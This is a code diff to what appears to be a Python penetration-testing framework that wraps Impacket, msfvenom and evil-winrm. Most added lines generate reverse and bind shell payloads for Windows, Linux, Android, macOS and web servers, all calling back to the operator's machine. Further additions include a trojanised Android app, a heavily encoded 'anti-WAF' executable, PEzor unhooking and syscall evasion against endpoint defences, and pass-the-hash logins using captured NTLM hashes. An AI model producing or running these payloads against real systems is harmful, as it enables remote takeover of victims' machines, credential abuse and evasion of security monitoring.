@@ -69,8 +69,10 @@ colour7 = "yellow"
 colour8 = "magenta"
 
 dataDir = "ROGUEAGENT"                                         # LOCAL DIRECTORY
-workDir = "BLACKBRIAR"
 httpDir = "TREADSTONE"
+workDir = "BLACKBRIAR"
+explDir = "OUTCOME"
+powrDir = "LARX"
 
 fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"         # FILE EXTENSIONS
 keyPath = "python3 /usr/share/doc/python3-impacket/examples/"  # PATH 2 IMPACKET
@@ -598,25 +600,16 @@ print("[+] Using localhost IP address " + localIP + "...")
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-if not os.path.exists(dataDir):
-   print("[-] Missing required files, you need to run install.py first...")
-   exit(1)
-else:
-   print("[+] Directory " + dataDir + " already exists...")  
-      
-if not os.path.exists(httpDir):
-   print("[-] Missing required files, you need to run install.py first...")
-   exit(1)
-else:
-   print("[+] Directory " + httpDir + " already exists...") 
-   
-if not os.path.exists(workDir):
-   os.mkdir(workDir)
-   print("[+] Directory " + workDir + " created...")
-else:
-   print("[+] Directory " + workDir + " already exists...")   
-   
+dirList = [dataDir, workDir, httpDir, explDir, powrDir]
+for x in range(0, len(dirList)):
+   if not os.path.exists(dirList[x]):
+      print("[-] Missing required files, you need to run install.py first...")
+      exit(1)
+   else:
+      print("[+] Directory " + dirList[x] + " already exists...")  
+         
 print("[+] Populating system variables...")
+
 if not os.path.exists(dataDir + "/usernames.txt"):			
    command("touch " + dataDir + "/usernames.txt")
    print("[+] File usernames.txt created...")
@@ -647,21 +640,21 @@ if not os.path.exists(dataDir + "/tokens.txt"):
 else:
    print("[+] File tokens.txt already exists...")
    
-SKEW = 0                                  # TIME-SKEW SWITCH
-DOMC = 0                                  # DOMAIN SWITCH
-DNSC = 0                                  # DNS SWITCH
-HTTP = 0				  # HTTP SERVER PORT
+SKEW = 0                                # TIME-SKEW SWITCH
+DOMC = 0                                # DOMAIN SWITCH
+DNSC = 0                                # DNS SWITCH
+HTTP = 0				# HTTP SERVER PORT
 
-COL1 = 40                                 # MAX LEN SESSION DATA
-COL2 = 44                                 # MAX LEN SHARE NAME
-COL3 = 23                                 # MAX LEN USER NAME
-COL4 = 32                                 # MAX LEN NTLM HASH
-COL5 = 1                                  # MAX LEN TOKEN VALUE
+COL1 = 40                               # MAX LEN SESSION DATA
+COL2 = 44                               # MAX LEN SHARE NAME
+COL3 = 23                               # MAX LEN USER NAME
+COL4 = 32                               # MAX LEN NTLM HASH
+COL5 = 1                                # MAX LEN TOKEN VALUE
 
-SHAR = [" "*COL2]*maxUser						# SHARE NAMES
-USER = [" "*COL3]*maxUser						# USER NAMES
-HASH = [" "*COL4]*maxUser						# NTLM HASH
-VALD = ["0"*COL5]*maxUser						# USER TOKENS
+SHAR = [" "*COL2]*maxUser		# SHARE NAMES
+USER = [" "*COL3]*maxUser		# USER NAMES
+HASH = [" "*COL4]*maxUser		# NTLM HASH
+VALD = ["0"*COL5]*maxUser		# USER TOKENS
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -1164,47 +1157,56 @@ while True:
       
       if checkParams != 1:
          print("[*] Creating windows exploits...")         
-         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + httpDir + "/win_x86_normal_shell.exe > arsenal.tmp 2>&1")
-         command("msfvenom -p windows/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + httpDir + "/win_x64_onestage_shell.exe > arsenal.tmp 2>&1")
-         command("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + httpDir + "/win_http_reverse_shell.exe > arsenal.tmp 2>&1")
-         command("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + httpDir + "/win_https_reverse_shell.exe > arsenal.tmp 2>&1")
-         command("msfvenom -p cmd/windows/reverse_powershell             LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + httpDir + "/win_powershell.bat > arsenal.tmp 2>&1")
-         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + httpDir + "/win_macro.vba > arsenal.tmp 2>&1")         
-         command("msfvenom -p windows/meterpreter/reverse_tcp_allports   LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + httpDir + "/win_allports_reverse_shell.exe > arsenal.tmp 2>&1")
-         command("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + httpDir + "/win_bind_shell.exe > arsenal.tmp 2>&1")
-         command("msfvenom -p windows/shell_hidden_bind_tcp              RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + httpDir + "/win_bind_hidden_shell.exe > arsenal.tmp 2>&1")
+
+         command("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_onestage_shell.exe > arsenal.tmp 2>&1")         
+         command("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_http_reverse_shell.exe >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_https_reverse_shell.exe >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x64_macro.vba >> arsenal.tmp 2>&1")         
+         if TIP[:5] != "EMPTY":
+            command("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_shell.exe >> arsenal.tmp 2>&1")
+            command("msfvenom -p windows/shell_hidden_bind_tcp           AHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x64_bind_hidden_shell.exe >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_normal_shell.exe >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_http_reverse_shell.exe >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_https_reverse_shell.exe >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/win_x86_macro.vba >> arsenal.tmp 2>&1")         
+         command("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_x86_bind_shell.exe >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp_allports	 LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/win_allports_reverse_shell.exe >> arsenal.tmp 2>&1")         
+         command("msfvenom -p cmd/windows/reverse_powershell  		 LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/win_powershell.bat >> arsenal.tmp 2>&1")
          
          print("[*] Creating linux exploits...")
-         command("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + httpDir + "/lin_x86_reverse_shell.elf > arsenal.tmp 2>&1")
-         command("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + httpDir + "/lin_x64_reverse_shell.elf > arsenal.tmp 2>&1")
-         command("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + httpDir + "/lin_x86_reverse_http_shell.elf > arsenal.tmp 2>&1")
-         command("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + httpDir + "/lin_x64_reverse_http_shell.elf > arsenal.tmp 2>&1")
-         command("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + httpDir + "/lin_multi_bind_shell.elf > arsenal.tmp 2>&1")
-         command("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + httpDir + "/lin_single_bind_shell.elf > arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_shell.elf >> arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x64/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_shell.elf >> arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x86/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x86_reverse_http_shell.elf >> arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_x64_reverse_http_shell.elf >> arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_multi_bind_shell.elf >> arsenal.tmp 2>&1")
+         command("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/lin_single_bind_shell.elf >> arsenal.tmp 2>&1")
          
          print("[*] Creating android exploits...")
-         command("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + httpDir + "/android_reverse_shell.apk > arsenal.tmp 2>&1")
-         command("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + httpDir + "/android_embed_shell.apk > arsenal.tmp 2>&1")
-         command("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + httpDir + "/android_reverse_http_shell.apk > arsenal.tmp 2>&1")
-         command("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + httpDir + "/android_reverse_https_shell.apk > arsenal.tmp 2>&1")
+#        command("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
+         command("msfvenom -x anyApp.apk android/meterpreter/reverse_tcp LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/android_embed_shell.apk >> arsenal.tmp 2>&1")
+         command("msfvenom -p android/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_http_shell.apk >> arsenal.tmp 2>&1")
+         command("msfvenom -p android/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_https_shell.apk >> arsenal.tmp 2>&1")
          
          print("[*] Creating mac exploits...")
-         command("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + httpDir + "/mac_reverse_shell.macho > arsenal.tmp 2>&1")
-         command("msfvenom -p osx/x86/shell_bind_tcp RHOST="                     + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + httpDir + "/mac_bind_shell.macho > arsenal.tmp 2>&1")
+         command("msfvenom -p osx/x86/shell_reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_reverse_shell.macho >> arsenal.tmp 2>&1")
+         command("msfvenom -p osx/x86/shell_bind_tcp RHOST="                     + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f macho -o " + explDir + "/mac_bind_shell.macho >> arsenal.tmp 2>&1")
          
          print("[*] Creating other exploits...")
-         command("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + httpDir + "/web_reverse_shell.php > arsenal.tmp 2>&1")
-         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + httpDir + "/java_reverse_shell.jsp > arsenal.tmp 2>&1")
-         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + httpDir + "/asp_reverse_shell.asp > arsenal.tmp 2>&1")
-         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + httpDir + "/war_reverse_shell.war > arsenal.tmp 2>&1")
-         command("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + httpDir + "/bash_reverse_shell.sh > arsenal.tmp 2>&1")
-         command("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + httpDir + "/python_reverse_shell.py > arsenal.tmp 2>&1")
-         command("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + httpDir + "/perl_reverse_shell.pl > arsenal.tmp 2>&1")
+         command("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/web_reverse_shell.php >> arsenal.tmp 2>&1")
+         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/java_reverse_shell.jsp >> arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f asp    -o " + explDir + "/asp_reverse_shell.asp >> arsenal.tmp 2>&1")
+         command("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/war_reverse_shell.war >> arsenal.tmp 2>&1")
+         command("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/bash_reverse_shell.sh >> arsenal.tmp 2>&1")
+         command("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/python_reverse_shell.py >> arsenal.tmp 2>&1")
+         command("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/perl_reverse_shell.pl >> arsenal.tmp 2>&1")
          
          # ANTI WAF ----         
-         command("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 5 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + httpDir + "/win_encoded_shell.exe > arsenal.tmp 2>&1")
+         command("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "/win_encoded_shell.exe >> arsenal.tmp 2>&1")
          
          command("chmod +X *.*")
+         
+         command("mv ./OUTCOME/win_x86_https_reverse_shell.exe ./OUTCOME/PEzor/win_x86_https_reverse_shell.exe")
+         command("bash ./OUTCOME/PEzor/PEzor.sh -sgn -unhook -syscalls win_x86_https_reverse_shell.exe")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3355,14 +3357,14 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using the HASH value as a password credential...")
             if IP46 == "-4":
-               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
             else:
-               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
          else:
             if IP46 == "-4":
-               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")            
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
             else:
-               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
       prompt()
             
 # ------------------------------------------------------------------------------------- 
